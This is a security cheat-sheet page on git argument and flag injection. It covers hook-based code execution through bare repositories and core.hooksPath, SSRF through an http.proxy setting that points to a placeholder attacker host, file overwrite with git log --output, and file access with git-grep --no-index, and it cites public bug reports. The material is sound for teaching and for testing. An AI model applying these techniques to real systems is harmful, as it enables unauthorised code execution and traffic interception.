# git

## Abusing bare repositories

You can use bare repositories to deliver custom git hooks and execute arbitrary code. For instance, if the vulnerable code executes the following bash commands:

```bash
$ git clone -- "<REPO>" "target_directory"
$ cd "target_directory"
$ git checkout "subproject"
```

You can create a repo with the `subproject` folder, which is a bare repository with a payload in the post checkout hook:

```bash
$ git clone "<REPO>" target_directory
$ cd target_directory
$ mkdir subproject
$ cd subproject
$ git init --bare
$ echo "#!/bin/sh" > hooks/post-checkout
$ echo "echo 'arbitrary code here'" >> hooks/post-checkout
$ # commit and push
```

References:
- [Writeup: 4 Google Cloud Shell bugs explained – bug #3](https://offensi.com/2019/12/16/4-google-cloud-shell-bugs-explained-bug-3/)
- [githooks docs](https://git-scm.com/docs/githooks)

## git-clone

{% embed url="https://git-scm.com/docs/git-clone" %}

### --config

Set a configuration variable in the newly-created repository; this takes effect immediately after the repository is initialized, but before the remote history is fetched or any files checked out.

#### core.hooksPath

`core.hooksPath` sets different path to hooks. You can create the post checkout hook within a repository, set the path to hooks with the `hooksPath`, and execute arbitrary code.

```bash
$ git clone "<REPO>" target_directory
$ cd target_directory
$ mkdir hooks
$ echo "#!/bin/sh" > hooks/post-checkout
$ echo "echo 'arbitrary code here'" >> hooks/post-checkout
$ # commit and push
```

To execute the payload, run the git-clone:

```bash
$ git clone -c core.hooksPath=hooks "<REPO>"
```

References:
- [git-config docs: core.hooksPath](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath)
- [githooks docs](https://git-scm.com/docs/githooks)

#### http.proxy and http.&lt;URL&gt;.proxy

`http.proxy` or `http.<URL>.proxy` override the HTTP proxy. You can use this to get SSRF:

```bash
$ git clone -c http.proxy=http://attacker-website.com -- "<REPO>" target_directory
$ git clone -c http.http://website.com/.proxy=http://attacker-website.com -- "<REPO>" target_directory
```

Pay attention to other `http.*` configs and `remote.<name>.proxy`, they can help to increase the impact.

References:
- [Report: Injection of `http.<url>.*` git config settings leading to SSRF](https://hackerone.com/reports/855276)
- [git-config docs: http.proxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-httpproxy)
- [git-config docs: remote.<name>.proxy](https://git-scm.com/docs/git-config#Documentation/git-config.txt-remoteltnamegtproxy)

### &lt;directory&gt;

git-clone allows you to specify a new directory to clone into. Cloning into an existing directory is only allowed if the directory is empty. You can use this to write a repo outside a default folder.

```bash
$ git clone -- "<REPO>" target_directory
```

## git-log

{% embed url="https://git-scm.com/docs/git-log" %}

### --output

`output` definea a specific file to output instead of stdout. You can use this to rewrite arbitrary files.

```bash
$ git log --output=/tmp/arbitrary_file
$ cat /tmp/arbitrary_file
commit c79538fb19b1d9d21bf26e9ad30fdeb90be1eaf0
Author: User <user@local>
Date:   Fri Aug 29 00:00:00 2021 +0000

    Controlled content
```

References:
- [Report: Git flag injection - local file overwrite to remote code execution](https://hackerone.com/reports/658013)
- [Report: Git flag injection leading to file overwrite and potential remote code execution](https://hackerone.com/reports/653125)

## git-grep

{% embed url="https://git-scm.com/docs/git-grep" %}

### --no-index

`no-index` tells the git-grep to search files in the current directory that is not managed by Git. In other words, if a working directory is different from a repository one `no-index` allows you to get access to files in the working directiory.

References:
- [Report: Git flag injection - Search API with scope 'blobs'](https://hackerone.com/reports/682442)
